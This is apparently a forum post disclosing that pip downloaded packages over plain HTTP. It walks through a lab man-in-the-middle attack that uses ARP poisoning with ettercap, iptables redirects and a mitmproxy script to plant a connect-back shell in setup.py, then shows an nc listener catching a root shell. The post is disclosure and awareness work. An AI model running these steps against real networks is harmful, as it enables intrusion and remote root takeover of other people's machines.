# Warning: don't use pip in an untrusted network! – a practical man-in-the-middle attack on pip

I've been messing around with pip lately and noticed something I wasn't quite aware of before, and I'm posting it here to make sure everyone knows about this (self post, no karma).

## The problem

**pip downloads all packages over plain HTTP** (even though PyPi *has* a valid certificate; Edit: has only got a CACert cert). There is a simple MD5 checksum check, but this doesn't help much as long as they are transmitted over an insecure channel. You usually run pip as root (unless you are installing into a virtualenv), and pip runs the `setup.py` from the downloaded package. Yes, if you do `pip install something`, **you are theoretically giving root access to everyone who could intercept your connection** (this includes everyone on your local network). This is quite unbelievable.

**DO NOT install packages using pip (and possibly easy\_install) in an untrusted environment!**

I wanted to verify how easy it is to exploit this, because there's always someone who will tell you that a possible attack is too complicated and too much effort to implement. It's not.

I've hacked together a script which intercepts all package files downloaded from PyPi, unpacks them, adds an additional line to `setup.py` which will connect back to the attacker and provide him with a (root) shell and packs the archive again. This only takes a second or two and works fully transparent.

## Proof Of Concept

See this as an example on how easy it is to exploit this and similar vulnerabilities.

You need a few packages for this to work:

```

sudo apt-get install atool
sudo pip install mitmproxy
```

(if you have not heard of mitmproxy before, go take a look at the docs – it's a very useful HTTP debugging tool)

Download this gist and save it as `pip_intercept.py`:

<https://gist.github.com/4698537>

Set up forwarding rules:

```

echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
sudo iptables -t nat -A POSTROUTING -j MASQUERADE
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
```

Run the proxy:

```

mitmproxy -T -z -s pip_intercept.py
```

Now, you should see all HTTP traffic forwarded by your machine running through mitmproxy. You either have to run this on a gateway, or use a tool like `ettercap` to redirect traffic over your local machine.

Example:

```

sudo ettercap -o -T -P repoison_arp -M arp:remote /192.168.1.1/ /192.168.1.33/
```

This intercepts all traffic between 192.168.1.1 (the gateway) and 192.168.1.33 and re-routes it over your machine.

The script loaded into mitmproxy will automatically manipulate all PyPi downloads and connect back with a shell to the IP and port specified in the script.

I've tried this in my lab and it worked perfectly well.

First, I started a listener on the attacker machine:

```

nc -l 4444
```

Then, I downloaded an arbitrary package on one of the machines in the network:

```

~# sudo pip install requests

Downloading/unpacking requests
  Downloading requests-1.1.0.tar.gz (339kB): 339kB downloaded
  Running setup.py egg_info for package requests

Installing collected packages: requests
  Running setup.py install for requests

Successfully installed requests
Cleaning up...
```

Then, back on the attacker machine:

```

id
uid=0(root) gid=0(root) groups=0(root)
```

Remote root shell! Ooops. (if you would improve the script a bit it'd work on Windows as well).

## Solution?

Never, ever download something over an unsecure connection and then execute it, especially not as root, if you can't verify its integrity. I don't understand why this wasn't already fixed like a few years ago. The average user clearly isn't aware of this danger.

Can't be that hard to fix (if I've got some more spare time I'll try it myself instead of just complaining).

Ruby's `gem` package manager, for example, uses SSL *and* verifies the cert:

```

 WARNING:  Error fetching data: SSL_connect returned=1 errno=0 state=SSLv3 read server certificate B: certificate verify failed (https://rubygems.org/latest_specs.4.8.gz)
 ERROR:  While executing gem ... (Gem::RemoteFetcher::FetchError)
 SSL_connect returned=1 errno=0 state=SSLv3 read server certificate B: certificate verify failed (https://rubygems.org/gems/bundler-1.2.3.gem)
```

**Edit:** I've just got an angry PM – no, I did not want to imply that Ruby is more secure than Python (just read the recent posts in [r/netsec](/r/netsec/) about some *very* embarrassing Rails bugs). I wanted to point out that other similar package managers have implemented this a long time ago, not start yet another language war. Guess what, I use both languages and while Python beats most other languages in many aspects (and loses in others) and it's my preferred language, both are great. The right tool for the job.

**Edit 2:** Unsurprisingly, `easy_install` is vulnerable as well. Just in case anyone was wondering.
